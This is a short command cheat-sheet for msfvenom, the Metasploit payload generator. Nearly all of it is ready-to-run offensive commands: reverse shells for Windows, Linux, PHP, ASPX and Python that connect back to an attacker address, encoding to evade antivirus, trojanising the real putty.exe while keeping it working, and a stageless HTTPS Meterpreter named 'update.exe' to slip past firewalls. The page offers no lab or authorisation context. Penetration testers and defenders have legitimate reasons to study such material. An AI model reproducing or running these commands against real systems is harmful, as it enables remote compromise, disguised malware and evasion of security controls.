---
title: Msfvenom Command List
date: 2026-01-05
category: commands
enrich: false
tags: msfvenom, cybersecurity, command reference
description: Top 10 essential commands for msfvenom.
---

# MSFVenom Command Guide

**MSFVenom** is a component of Metasploit used to generate Payloads (shellcode, executables) to trigger shells.

## Top 10 Useful Commands

### 1. List Payloads
```bash
msfvenom -l payloads
```
**Explanation:** Show all available payloads.

### 2. Windows Reverse TCP (Exe)
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
```
**Explanation:** Generate a Windows executable reverse shell.

### 3. Linux Reverse TCP (Elf)
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```
**Explanation:** Generate a Linux binary payload.

### 4. Web Payload (PHP)
```bash
msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php
```
**Explanation:** PHP reverse shell for web servers.

### 5. Web Payload (ASPX)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f aspx -o shell.aspx
```
**Explanation:** ASPX shell for IIS servers.

### 6. Script Payload (Python)
```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.10 LPORT=4444 -f raw > shell.py
```
**Explanation:** Python script payload.

### 7. List Formats
```bash
msfvenom --list formats
```
**Explanation:** See valid output formats (`-f`) like exe, elf, war, raw, py, c.

### 8. Encode Payload (Bypass AV)
```bash
msfvenom -p windows/meterpreter/reverse_tcp ... -e x86/shikata_ga_nai -i 5
```
**Explanation:** Encode the shellcode 5 times (`-i 5`) using Shikata Ga Nai to evade simple AV signatures.

### 9. Inject into Real Binary
```bash
msfvenom -p windows/meterpreter/reverse_tcp ... -x putty.exe -k -f exe -o putty_evil.exe
```
**Explanation:** Embed payload into `putty.exe` while keeping the original functionality (`-k`).

### 10. Shellcode (C format)
```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f c
```
**Explanation:** Output raw C-formatted bytes, useful for exploit development buffer overflows.

## The Most Powerful Command
(The "Stageless" Meterpreter HTTPS):
```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.10.10 LPORT=443 -f exe -o update.exe
```
**Explanation:** Uses HTTPS (encrypted traffic) on port 443 (allowed by firewalls), 64-bit, and "meterpreter_" (stageless) for max stability.

